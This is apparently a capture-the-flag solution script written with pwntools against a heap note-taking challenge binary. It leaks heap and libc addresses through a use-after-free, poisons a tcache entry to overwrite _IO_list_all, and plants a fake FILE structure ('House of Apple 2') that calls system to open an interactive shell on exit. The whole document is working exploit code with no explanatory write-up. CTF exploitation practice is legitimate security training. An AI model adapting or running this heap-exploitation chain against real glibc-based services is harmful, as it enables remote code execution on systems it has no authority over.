#!/usr/bin/env python3
from pwn import *

# === CONFIGURATION ===
BINARY = "./chall"
HOST, PORT = "chall.0xfun.org", 10582

context.binary = elf = ELF(BINARY)
libc = ELF("./libc.so.6")
context.log_level = 'info'

# === OFFSETS ===
UNSORTED_BIN_OFFSET = 0x1e7b20  # from libc base
IO_WFILE_JUMPS = 0x1e6228

def get_process():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BINARY, gdbscript='''
            b *main
            continue
        ''')
    else:
        return process(BINARY)

def create(idx, size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendlineafter(b'Size: ', str(size).encode())
    io.sendafter(b'Data: ', data)

def delete(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(idx).encode())

def read_note(idx):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.recvuntil(b'Data: ')
    data = io.recvuntil(b'\n1.', drop=True)
    return data

def edit(idx, data):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index: ', str(idx).encode())
    io.sendafter(b'New Data: ', data)

def exploit():
    global io
    io = get_process()

    # ========== STEP 1: Heap leak ==========
    create(0, 0x18, b'A' * 0x18)
    delete(0)
    heap_enc = u64(read_note(0)[:8])
    heap_base = heap_enc << 12
    log.info(f"heap_base: {hex(heap_base)}")

    # ========== STEP 2: Libc leak ==========
    # Create 9 chunks of 0x400, index 8 is guard
    for i in range(9):
        create(i, 0x400, b'C' * 8)

    # Fill tcache for 0x410 size (7 entries)
    for i in range(7):
        delete(i)

    # Free index 7 -> unsorted bin (guarded by index 8)
    delete(7)

    # Read freed unsorted bin chunk -> libc leak
    data = read_note(7)
    libc_leak = u64(data[:8])
    libc_base = libc_leak - UNSORTED_BIN_OFFSET
    log.info(f"libc_base: {hex(libc_base)}")

    system_addr = libc_base + libc.sym['system']
    io_list_all = libc_base + libc.sym['_IO_list_all']
    io_wfile_jumps = libc_base + IO_WFILE_JUMPS
    log.info(f"system: {hex(system_addr)}")
    log.info(f"_IO_list_all: {hex(io_list_all)}")
    log.info(f"_IO_wfile_jumps: {hex(io_wfile_jumps)}")

    # ========== STEP 3: Compute heap chunk addresses ==========
    # Heap layout (glibc 2.42):
    # +0x000: tcache_perthread_struct (0x300 chunk - larger in glibc 2.42!)
    # +0x300: small chunk (0x20) [freed, from initial 0x18 alloc]
    # +0x320: chunk0 (0x410)
    # +0x730: chunk1 (0x410)
    # chunk_i_header = heap_base + 0x320 + i * 0x410
    # chunk_i_userdata = heap_base + 0x330 + i * 0x410

    chunk6_data = heap_base + 0x330 + 6 * 0x410  # = heap_base + 0x1b90
    log.info(f"chunk6_data: {hex(chunk6_data)}")

    # ========== STEP 4: Tcache poison ==========
    # Tcache for 0x410: chunk6 -> chunk5 -> chunk4 -> ... -> chunk0
    # chunk6 is head, its fd (mangled) = PROTECT(chunk6_data, chunk5_data)
    # We overwrite chunk6's fd to point to io_list_all

    mangled_target = (chunk6_data >> 12) ^ io_list_all
    log.info(f"mangled target for tcache: {hex(mangled_target)}")

    # Write only the first 8 bytes (the fd pointer)
    edit(6, p64(mangled_target))

    # ========== STEP 5: Build fake FILE struct ==========
    # First allocation from tcache gets chunk6 back
    # We'll use chunk6 to hold our fake FILE + wide_data + wide_vtable

    # House of Apple 2 layout at chunk6_data:
    # 0x000 - 0x0e0: fake _IO_FILE_plus
    # 0x100 - 0x1e8: fake _IO_wide_data
    # 0x200 - 0x270: fake wide_vtable
    # 0x300 - 0x310: _lock area (zeroed = unlocked mutex)

    import struct as st
    fake_file = bytearray(0x400)

    # _IO_FILE_plus fields
    st.pack_into('<8s', fake_file, 0x00, b'  sh;\x00\x00\x00')  # _flags: system arg
    st.pack_into('<Q', fake_file, 0x20, 0)                       # _IO_write_base = 0
    st.pack_into('<Q', fake_file, 0x28, 1)                       # _IO_write_ptr = 1 (> base → trigger overflow)
    st.pack_into('<Q', fake_file, 0x38, chunk6_data + 0x300)     # _IO_buf_base = non-NULL (prevents _IO_doallocbuf → malloc crash)
    st.pack_into('<Q', fake_file, 0x40, chunk6_data + 0x400)     # _IO_buf_end > buf_base
    st.pack_into('<Q', fake_file, 0x68, 0)                       # _chain = NULL (end of FILE list)
    st.pack_into('<Q', fake_file, 0x88, chunk6_data + 0x300)     # _lock → valid writable zeroed memory
    st.pack_into('<Q', fake_file, 0xa0, chunk6_data + 0x100)     # _wide_data → our fake wide_data
    st.pack_into('<i', fake_file, 0xc0, 0)                       # _mode = 0 (byte mode → write_ptr > write_base path)
    st.pack_into('<Q', fake_file, 0xd8, io_wfile_jumps)          # vtable = _IO_wfile_jumps

    # _IO_wide_data fields (at offset 0x100)
    # wide _IO_write_base at 0x18 = 0 → triggers _IO_wdoallocbuf
    # wide _IO_buf_base at 0x30 = 0 → _IO_wdoallocbuf calls __doallocate
    st.pack_into('<Q', fake_file, 0x100 + 0xe0, chunk6_data + 0x200)  # _wide_vtable

    # Fake wide vtable (at offset 0x200)
    st.pack_into('<Q', fake_file, 0x200 + 0x68, system_addr)    # __doallocate = system

    payload = bytes(fake_file)
    assert len(payload) <= 0x400

    # Allocate chunk6 back with fake FILE
    create(0, 0x400, payload)

    # ========== STEP 6: Overwrite _IO_list_all ==========
    # Next allocation goes to io_list_all
    # Write pointer to our fake FILE (chunk6_data)
    create(1, 0x400, p64(chunk6_data))

    # ========== STEP 7: Trigger ==========
    # Exit -> _IO_flush_all_lockp -> processes our fake FILE -> system("  sh;")
    log.info("Triggering exit...")
    io.sendlineafter(b'> ', b'5')

    io.interactive()

if __name__ == "__main__":
    exploit()
